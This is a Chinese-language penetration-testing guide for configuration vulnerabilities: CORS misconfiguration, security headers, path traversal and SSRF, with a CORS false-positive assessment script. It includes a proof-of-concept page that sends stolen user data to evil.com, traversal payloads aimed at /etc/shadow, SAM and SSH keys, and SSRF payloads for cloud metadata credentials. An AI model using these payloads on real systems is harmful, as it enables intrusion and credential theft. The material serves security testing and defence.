# 安全配置漏洞测试

## 1. 概述

安全配置漏洞包括 CORS 配置不当、安全响应头缺失、路径遍历等配置层面的安全问题。

## 2. CORS 配置测试

### 2.1 测试方法

```bash
# 1. 检查 CORS 响应头
GET /api/user/info
Origin: http://evil.com

# 检查响应
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: *
```

### 2.2 风险判断

| 配置 | 风险等级 | 说明 |
|------|----------|------|
| `ACAO: *` + `ACAC: true` | 高 | 任何站点可获取用户数据 |
| `ACAO: *` | 中 | 仅可获取公开数据 |
| `ACAO: null` | 高 | 可能被绕过 |
| `ACAO: <恶意域名>` + `ACAC: true` | **严重** | 动态反射任意Origin且带凭证 |
| 具体域名（白名单） | 低 | 正常配置 |

### 2.3 动态Origin反射测试（重要！）

**实测发现的漏洞模式**：
```python
# 测试不同Origin的CORS响应
origins = [
    "https://evil.com",
    "https://attacker.com",
    "https://console.ncszkpark.com",
    "null",
]

for origin in origins:
    r = requests.get(api_url, headers={"Origin": origin})
    allow_origin = r.headers.get('Access-Control-Allow-Origin')
    allow_cred = r.headers.get('Access-Control-Allow-Credentials')
    
    print(f"Origin: {origin}")
    print(f"  Allow-Origin: {allow_origin}")
    print(f"  Allow-Credentials: {allow_cred}")
    
    # 严重漏洞：对任意Origin都信任且允许凭证
    if allow_origin == origin and allow_cred == 'true':
        print(f"  [严重CORS漏洞] Origin={origin} 被信任！")
```

**实际响应示例**：
```
Origin: https://evil.com
  Allow-Origin: https://evil.com
  Allow-Credentials: true
  [严重CORS漏洞] Origin=https://evil.com 被信任！

Origin: https://attacker.com
  Allow-Origin: https://attacker.com
  Allow-Credentials: true
  [严重CORS漏洞] Origin=https://attacker.com 被信任！
```

**与传统 * 通配符的区别**：
```
传统漏洞: ACAO: * (静态配置)
新漏洞:   ACAO: <动态反射> + ACAC: true (动态配置错误)

两种都危险，但动态反射更难检测：
- 静态 * 容易被安全扫描发现
- 动态反射每个域名都信任，容易被忽略
```

### 2.4 利用条件

```javascript
// POC：利用 CORS 窃取用户数据
<!DOCTYPE html>
<html>
<body>
<script>
fetch('http://api/user/info', {
    credentials: 'include'
}).then(resp => resp.json())
  .then(data => {
    fetch('http://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});
</script>
</body>
</html>
```

### 2.4 JSONP 利用

```bash
# 检查 JSONP 端点
GET /api/user/info?callback=alert

# 如果响应
alert({"userId": 1, "name": "admin"});
```

## 3. 安全响应头测试

### 3.1 必须存在的响应头

| 响应头 | 作用 | 安全风险 |
|--------|------|----------|
| X-Frame-Options | 防止点击劫持 | iframe 嵌入 |
| X-Content-Type-Options | 防止 MIME 嗅探 | 类型混淆 |
| X-XSS-Protection | XSS 过滤器 | 反射型 XSS |
| Content-Security-Policy | 内容安全策略 | XSS/注入 |
| Strict-Transport-Security | 强制 HTTPS | 中间人攻击 |
| Referrer-Policy | 引用来源控制 | 信息泄露 |

### 3.2 测试方法

```bash
# 获取所有响应头
curl -I http://api/

# 检查每个响应头
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000
Referrer-Policy: no-referrer
```

### 3.3 响应头安全值

```bash
# X-Frame-Options
X-Frame-Options: DENY                    # 完全禁止
X-Frame-Options: SAMEORIGIN              # 仅同源允许

# X-Content-Type-Options
X-Content-Type-Options: nosniff           # 防止嗅探

# Content-Security-Policy
Content-Security-Policy: default-src 'self'; script-src 'self'

# Strict-Transport-Security
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

## 4. 路径遍历测试

### 4.1 测试 Payload

```bash
# 基础遍历
/file?path=../../etc/passwd
/file?path=../../../windows/system32/drivers/etc/hosts

# URL 编码
/file?path=..%2F..%2F..%2Fetc%2Fpasswd
/file?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# 双编码
/file?path=%252e%252e%252f%252e%252e%252fetc%252fpasswd

# 空字节
/file?path=../../etc/passwd%00.txt

# 反斜杠（Windows）
/file?path=..\..\..\windows\system32\config\sam
```

### 4.2 常见路径

| 系统 | 文件 | 说明 |
|------|------|------|
| Linux | `/etc/passwd` | 用户列表 |
| Linux | `/etc/shadow` | 密码哈希 |
| Linux | `/root/.ssh/id_rsa` | SSH 私钥 |
| Windows | `C:\Windows\System32\config\SAM` | 用户账户 |
| Config | `/app/config.json` | 应用配置 |
| Config | `/app/.env` | 环境变量 |

### 4.3 利用链

```bash
# 1. 读取配置文件
GET /file?path=../../app/config.json

# 2. 获取数据库密码
GET /file?path=../../etc/passwd

# 3. SSH 私钥
GET /file?path=../../root/.ssh/id_rsa
```

## 5. SSRF 测试

### 5.1 测试点

```bash
# URL 参数
GET /api/fetch?url=http://example.com
GET /api/preview?url=https://internal.corp.local

# 文件读取
GET /api/load?file=http://evil.com/shell.php

# 图片加载
GET /api/image?url=http://internal.img/
```

### 5.2 SSRF Payload

```bash
# 本地地址
?url=http://127.0.0.1:80
?url=http://localhost:8080
?url=http://0.0.0.0:22

# 云元数据
?url=http://169.254.169.254/latest/meta-data/
?url=http://metadata.google.internal/computeMetadata/v1/

# 内网地址
?url=http://192.168.1.1
?url=http://10.0.0.1
?url=http://172.16.0.1
```

### 5.3 利用

```bash
# 读取云元数据
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 内网端口扫描
GET /api/fetch?url=http://192.168.1.1:22

# 读取内部文件
GET /api/fetch?url=file:///etc/passwd
```

## 6. 测试检查清单

```
□ CORS 配置测试（ACAO + ACAC）
□ JSONP 端点检测
□ 安全响应头缺失检测
□ 路径遍历测试（基础、编码、空字节）
□ SSRF 测试（内网、元数据）
□ 评估漏洞利用难度和影响
```

## 7. CORS误报判断标准

### 7.1 核心判断原则

```
【重要】CORS配置错误 ≠ 漏洞！

判断逻辑：
1. 先确认接口是否需要认证
2. 再确认返回数据是否为用户敏感信息
3. 最后判断CORS配置的实际风险

【真实CORS漏洞特征】
- 需要认证的接口（如 /user/info, /order/list）
- 返回用户私有数据（如手机号、地址、订单）
- 攻击者可以诱导用户访问恶意页面获取数据

【CORS误报特征】
- 公开接口（如 /news, /products）
- 返回的数据本来就可以公开访问
- 只是配置了ACAO:*但无ACAC
```

### 7.2 curl + 对比验证流程

```bash
#!/bin/bash
# CORS漏洞误报判断流程

TARGET="http://api"

echo "=== CORS误报判断 ==="
echo ""

# 1. 测试公开接口（应该配置CORS）
echo "[1] 测试公开接口"
curl -s -I -H "Origin: https://evil.com" "${TARGET}/public/news" | grep -iE "(access-control|content-type)"
echo ""

# 2. 测试需要认证的接口
echo "[2] 测试需要认证的接口"
curl -s -I -H "Origin: https://evil.com" "${TARGET}/user/info" | grep -iE "(access-control|content-type)"
echo ""

# 3. 检查CORS响应头
check_cors() {
    local url=$1
    local name=$2
    
    echo "[$name] $url"
    
    # 预检请求
    OPTIONSResp=$(curl -s -I -X OPTIONS -H "Origin: https://evil.com" \
        -H "Access-Control-Request-Method: GET" \
        -H "Access-Control-Request-Headers: Authorization" \
        "$url")
    
    # GET请求
    GETResp=$(curl -s -I -H "Origin: https://evil.com" "$url")
    
    # 提取CORS头
    ACAO=$(echo "$GETResp" | grep -i "Access-Control-Allow-Origin:" | tr -d '\r' || echo "未设置")
    ACAC=$(echo "$GETResp" | grep -i "Access-Control-Allow-Credentials:" | tr -d '\r' || echo "未设置")
    ACAM=$(echo "$OPTIONSResp" | grep -i "Access-Control-Allow-Methods:" | tr -d '\r' || echo "未设置")
    
    echo "  ACAO: $ACAO"
    echo "  ACAC: $ACAC"
    echo "  ACAM: $ACAM"
    
    # 风险判断
    if echo "$ACAO" | grep -q "https://evil.com\|*"; then
        if echo "$ACAC" | grep -q "true"; then
            echo "  [高风险] 任意Origin允许携带凭证"
        else
            echo "  [中风险] ACAO配置为*或反射Origin"
        fi
    fi
    echo ""
}

# 测试各种接口
check_cors "${TARGET}/public/news" "公开接口"
check_cors "${TARGET}/user/info" "用户信息接口"
check_cors "${TARGET}/order/list" "订单接口"
```

### 7.3 多维度判断标准

```python
import requests

class CORSTester:
    """
    CORS漏洞误报判断
    
    【判断矩阵】
    配置                    | 需要认证    | 公开数据    | 用户私有数据
    -----------------------|-------------|-------------|---------------
    ACAO:* + ACAC:false    | 中风险      | 低风险      | 中风险
    ACAO:* + ACAC:true     | 高风险      | 低风险      | 严重
    ACAO:反射 + ACAC:false | 中风险      | 低风险      | 中风险
    ACAO:反射 + ACAC:true   | 严重       | 低风险      | 严重
    白名单域名              | 低风险      | 低风险      | 低风险
    """
    
    def __init__(self, target):
        self.target = target
        
    def get_cors_headers(self, url, origin="https://evil.com"):
        """获取CORS响应头"""
        resp = requests.get(url, headers={"Origin": origin})
        return {
            'status': resp.status_code,
            'acao': resp.headers.get('Access-Control-Allow-Origin', ''),
            'acac': resp.headers.get('Access-Control-Allow-Credentials', ''),
            'acam': resp.headers.get('Access-Control-Allow-Methods', ''),
            'acah': resp.headers.get('Access-Control-Allow-Headers', ''),
            'body_preview': resp.text[:500]
        }
    
    def is_public_endpoint(self, url):
        """
        判断接口是否公开
        
        【判断标准】
        - URL包含 public, anonymous, open 等关键词
        - 不需要 Authorization header
        - 返回的数据不需要登录就能获取
        """
        public_keywords = ['public', 'anonymous', 'open', 'login', 'signup', 'register']
        return any(kw in url.lower() for kw in public_keywords)
    
    def check_auth_required(self, url):
        """检查接口是否需要认证"""
        resp = requests.get(url)  # 无认证请求
        if resp.status_code == 401:
            return True  # 需要认证
        if resp.status_code == 200:
            # 检查是否返回"请登录"等提示
            if any(kw in resp.text.lower() for kw in ['login', '请登录', '未授权', 'unauthorized']):
                return True
        return False
    
    def assess_cors_risk(self, url):
        """
        评估CORS配置风险
        
        Returns:
            (is_vuln, severity, reason, details)
        """
        # 1. 获取CORS配置
        cors_info = self.get_cors_headers(url)
        
        # 2. 判断是否为公开接口
        is_public = self.is_public_endpoint(url)
        
        # 3. 判断是否需要认证
        needs_auth = self.check_auth_required(url)
        
        # 4. 风险评估
        acao = cors_info['acao']
        acac = cors_info['acac']
        
        # 无CORS头 → 安全
        if not acao:
            return False, "低", "未配置CORS", cors_info
        
        # ACAO:* 无 ACAC → 中风险（可被利用但无凭证）
        if acao == '*' and acac.lower() != 'true':
            if is_public:
                return False, "低", "公开接口配置ACAO:*但无凭证", cors_info
            else:
                return True, "中", "ACAO:*配置在高风险接口但无ACAC", cors_info
        
        # ACAO:* + ACAC:true → 严重
        if acao == '*' and acac.lower() == 'true':
            return True, "严重", "ACAO:* + ACAC:true，任意站点可获取用户凭证", cors_info
        
        # 反射Origin + ACAC:true → 严重
        if acao and acao != '*' and acac.lower() == 'true':
            return True, "严重", f"动态反射Origin({acao}) + ACAC:true", cors_info
        
        # 反射Origin（无条件）→ 需要进一步分析
        if acao and acao != '*':
            if needs_auth:
                return True, "高", f"反射Origin在需认证接口({acao})", cors_info
            else:
                return False, "中", f"反射Origin在公开接口({acao})", cors_info
        
        return False, "低", "CORS配置正常", cors_info

# 使用示例
if __name__ == "__main__":
    tester = CORSTester("http://api")
    
    test_urls = [
        "http://api/public/news",
        "http://api/user/info", 
        "http://api/order/list",
        "http://api/admin/users"
    ]
    
    for url in test_urls:
        is_vuln, severity, reason, details = tester.assess_cors_risk(url)
        
        print(f"\n[{'VULN' if is_vuln else 'SAFE'}] {severity} - {url}")
        print(f"  原因: {reason}")
        print(f"  响应预览: {details['body_preview'][:200]}")
```

### 7.4 实战误报案例

```
【案例1：公开接口的CORS配置】

场景：/api/public/news 配置了 ACAO:*

curl -I -H "Origin: https://evil.com" /api/public/news
Access-Control-Allow-Origin: *
Content-Type: application/json

判断：
- 接口是否为公开接口？是（news）
- 返回数据是否敏感？否（新闻公开）
- 结论：【误报】无需修复

---

【案例2：用户接口的CORS配置】

场景：/api/user/info 配置了 ACAO:*

curl -I -H "Origin: https://evil.com" /api/user/info
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Content-Type: application/json

判断：
- 接口是否为公开接口？否（用户信息）
- 返回数据是否敏感？是（用户私有信息）
- 结论：【确认漏洞】攻击者可诱导用户访问恶意页面获取用户信息
```

| 发现的漏洞 | 关联漏洞 | 利用路径 |
|------------|----------|----------|
| CORS | CSRF、数据窃取 | 跨域获取用户数据 |
| 路径遍历 | 配置泄露、密钥获取 | 读取敏感文件 |
| SSRF | 内网渗透、云IAM | 访问内部服务 |
